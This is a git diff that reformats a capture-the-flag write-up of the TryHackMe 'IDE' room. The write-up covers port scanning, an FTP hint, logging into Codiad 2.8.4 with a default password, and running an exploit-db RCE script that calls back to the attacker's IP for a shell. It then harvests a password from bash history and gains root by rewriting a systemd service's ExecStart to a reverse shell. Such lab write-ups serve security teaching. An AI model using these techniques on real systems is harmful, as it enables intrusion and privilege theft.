@@ -5,13 +5,13 @@ draft: false
 categories:
   - TryHackMe
 ---
-<img src="ide.png" width=200 height=200 alt="ide">
+
+{{< post-img src="ide.png" alt="ide" style="width: 200px;" >}}
 
 ## Enmeration
 
-### nmap
 
-```
+```bash
 Discovered open port 21/tcp on 10.10.6.68
 Discovered open port 80/tcp on 10.10.6.68
 Discovered open port 22/tcp on 10.10.6.68
@@ -59,9 +59,8 @@ PORT      STATE SERVICE REASON  VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 ```
 
-### ffuf
 
-```
+```bash
 .htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
 .htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
 .hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
@@ -78,16 +77,13 @@ themes                  [Status: 301, Size: 318, Words: 20, Lines: 10]
 ```
 
 The room said enumeration is important so we took that personally.
-
 full nmap scan or you miss the main thing...the real website is on port 62337
-
 But first lets grab whatever is in ftp folder
-
 At first I thought ftp folder was empty...the subfolder was named `...`
 
 cd into it and find a file named `-`
 
-```
+```text
 Hey john,
 I have reset the password as you have asked. Please use the default password to login.
 Also, please take care of the image file ;)
@@ -95,28 +91,24 @@ Also, please take care of the image file ;)
 ```
 
 nmap says the actual website use codiad 2.8.4
-
 As we dont know what that is we google but found its a web ide
-
 And there is an RCE vulnerability with exploitdb script
 
 random passwords trials got us in the web ide (I was about to bruteforce with hydra lol)
 
 `john : password`
 
-As we can login we see the code john was workig on but nothing useful in it
-
+As we can login we see the code john was working on but nothing useful in it
 let's use the exploit db python script to get inside
 
 `python exploit.py http://10.10.172.231:62337/ john password 10.8.226.203 2311 linux`
 
 And we are in
-
 first we get comfortable
 
 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
-```
+```bash
 www-data@ide:/home$ cd drac
 cd drac
 www-data@ide:/home/drac$ ls
@@ -129,7 +121,7 @@ cat: user.txt: Permission denied
 
 I am not even surprised
 
-```
+```bash
 ls -al
 total 52
 drwxr-xr-x 6 drac drac 4096 Aug 4 07:06 .
@@ -149,10 +141,9 @@ drwx------ 3 drac drac 4096 Jun 18 05:49 .local
 ```
 
 ok drac only can read the flag but anyone can read his bash history...lol
-
 that thing is supposed to go to void (/dev/null)
 
-```
+```bash
 cat .bash_history
 mysql -u drac -p 'Th3dRaCULa1sR3aL'
 
@@ -169,7 +160,7 @@ Now privileges
 
 ## privilege escalation
 
-```
+```bash
 sudo -l
 
 Matching Defaults entries for drac on ide:
@@ -182,7 +173,7 @@ User drac may run the following commands on ide:
 
 The ftp service? hmm? I dont know
 
-```
+```bash
 locate vsftpd.service
 /etc/systemd/system/multi-user.target.wants/vsftpd.service
 
@@ -206,7 +197,7 @@ WantedBy=multi-user.target
 
 Alright let's change the `ExecStart` to a reverse shell
 
-```
+```bash
 [Unit]
 Description=vsftpd FTP server
 After=network.target
@@ -225,7 +216,7 @@ We echo all that in `vsftpd.service` and listen with a new netcat on said port
 
 Now we restart the service..reload daemon first
 
-```
+```bash
 systemctl daemon-reload
 ==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
 Authentication is required to reload the systemd state.
@@ -235,7 +226,7 @@ Password: Th3dRaCULa1sR3aL
 ==== AUTHENTICATION COMPLETE ===
 ```
 
-```
+```bash
 drac@ide:/etc/systemd/system/multi-user.target.wants$ sudo /usr/sbin/service vsftpd restart
 ```
 
@@ -243,7 +234,7 @@ Aaand...NOTHING
 
 I don't know why but I had to do the restart twice
 
-```
+```bash
 root@ide:/# id
 id
 uid=0(root) gid=0(root) groups=0(root)
